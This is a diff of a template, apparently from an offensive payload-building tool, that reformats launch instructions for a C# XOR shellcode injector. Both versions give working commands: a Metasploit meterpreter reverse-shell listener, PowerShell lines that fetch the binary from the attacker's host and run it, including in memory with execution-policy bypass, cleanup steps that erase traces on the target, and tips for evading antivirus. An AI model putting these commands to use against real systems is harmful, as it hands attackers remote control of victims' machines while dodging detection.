@@ -96,35 +96,53 @@ output:
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
 
   launch_instructions: |
-    C# XOR Shellcode Injector - Launch Instructions
+    # Start Listener
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
+    ```
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
+    # Transfer and Execute
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    # Standard Execution
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    In-Memory Execution (C# Binary):
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [XORInjector.Program]::Main(@())"
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
 
-    Notes:
-    - Shellcode XOR-encoded with key: 0x{{ xor_key }} (single-byte XOR)
+    # In-Memory Execution (C# Binary)
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [XORInjector.Program]::Main(@())"
+    ```
+
+    # Notes
+    - Shellcode XOR-encoded with key: `0x{{ xor_key }}` (single-byte XOR)
     - Decryption occurs in-memory before injection into current process
-    - Uses VirtualAlloc, Marshal.Copy, CreateThread for self-injection
-    - EXITFUNC=thread ensures clean exit
+    - Uses `VirtualAlloc`, `Marshal.Copy`, `CreateThread` for self-injection
+    - `EXITFUNC=thread` ensures clean exit
     - Simpler than remote process injection (no inter-process operations)
     - Lower detection rate than remote injection (no suspicious API calls to other processes)
 
-    Troubleshooting:
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - Immediate crash: AV likely terminated process
-    - "Access Denied": Should not occur with self-injection; check if binary is blocked
-    - AV detection: XOR is weak encryption; consider AES or RC4 for better evasion
-    - Binary won't run: Windows SmartScreen or AV blocking execution
+    # Troubleshooting
+    - **No connection**: Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **Immediate crash**: AV likely terminated process
+    - **"Access Denied"**: Should not occur with self-injection; check if binary is blocked
+    - **AV detection**: XOR is weak encryption; consider AES or RC4 for better evasion
+    - **Binary won't run**: Windows SmartScreen or AV blocking execution
 
-    Cleanup:
-    On target:
-    $ taskkill /F /IM {{ output_file }} 2>nul
-    $ del {{ output_file }}
+    # Cleanup
+    **On target:**
+    ```cmd
+    taskkill /F /IM {{ output_file }} 2>nul
+    del {{ output_file }}
+    ```
